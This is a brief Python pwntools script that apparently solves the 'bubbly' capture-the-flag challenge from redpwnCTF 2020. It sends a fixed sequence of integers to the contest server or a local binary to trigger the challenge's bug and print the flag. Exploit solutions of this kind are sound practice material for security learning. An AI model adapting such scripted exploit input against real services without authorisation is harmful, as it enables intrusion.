from pwn import *

code = [2,1,2,3,4,5,6,7,8,4,5,6,7,4,5,6,4,5,3,1337]

if args.REMOTE:
    p = remote("2020.redpwnc.tf",31039)
else:
    p = process("./bubbly")

p.recvuntil("hand?\n")
for c in code:
    p.sendline(str(c))

print p.recvall()

